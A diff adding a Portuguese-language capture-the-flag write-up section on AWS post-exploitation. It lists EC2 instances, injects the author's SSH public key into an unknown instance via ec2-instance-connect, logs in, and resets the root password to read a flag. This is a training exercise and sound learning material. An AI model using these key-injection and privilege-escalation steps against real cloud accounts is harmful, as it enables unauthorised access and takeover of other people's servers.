@@ -84,3 +84,83 @@ Basicamente eu chamaria o cp passando o Bucket com o . --recusive, assim eu copi
 Depois fiz um cat no arquivo user-data.txt, encontrando a flag.
 
 ![flag desafio 03](/shw/pics/flag03.png)
+
+## Dia 04 - Pós-Exploração na AWS
+
+- Listar sevidores(ec2)
+
+```bash
+aws ec2 describe-instances
+```
+
+![ec2 IP](/shw/pics/ec2-ip-new.png)
+
+Colocamos a lista em leitor de JSON
+
+![lista json](/shw/pics/ec2-retorno-ip.png)
+
+Ao listar ec2, vimos IP que não conhecemos, fizemos um nmap e depois nmap sem o ping.
+
+- Conectar instância EC2:
+
+```bash
+ec2-instace-connect help
+```
+
+![ec2 help](/shw/pics/ec2.help.png)
+
+EC2 permite que o administrador de sistema envie uma chave ssh publica deles para um servidor.
+
+Olhamos o que precisamos enviar para ter esse acesso:
+
+```bash
+aws ec2-instance-connect send-ssh-public-key help
+```
+
+![send-ssh-help](/shw/pics/send-ssh-help.png)
+
+```bash
+aws ec2-instance-connect send-ssh-public-key \
+--instance-id i-1234567890abcdef0 \
+--instance-os-user ec2-user \
+--availability-zone us-east-2b \
+--ssh-public-key file://path/my-rsa-key.pub
+```
+
+- Precisamos criar chave ssh (só crie se você não tiver uma)
+
+```bahs
+ssh-keygen
+```
+
+- Precisamos enviar chave publica para o servidor.
+
+```bash
+aws ec2-instance-connect send-ssh-public-key --instance-id i-032802861b7c9c59c --instance-os-user ec2-user --ssh-public-key file:///home/kali/.ssh/id_rsa.pub --availability-zone us-east-1a --region us-east-1
+```
+
+- instance-id e availability-zone são daquele IP que não conhecemos.
+
+![dados ip](/shw/pics/dado-ip.png)
+
+- Chave enviado com sucesso
+
+![chave enviada](/shw/pics/ec2-send-key-ok.png)
+
+- Agora vamos conectar com o servidor passando a chave ssh(chave privada)
+
+```bash
+ssh -i /home/kali/.ssh/id_rsa ec2-user@44.202.22.33
+```
+
+![aws](/shw/pics/acessando-aws.png)
+
+**Desafio**: Virar usuario root da máquina
+**Solução**:
+
+- sudo passwd root : para mudar a senha do root
+- su - : coloquei a nova senha
+- ls -la: listei diretórios
+- cat root.txt : encontrei a flag
+
+![flag desafio 04](/shw/pics/flag04.png)
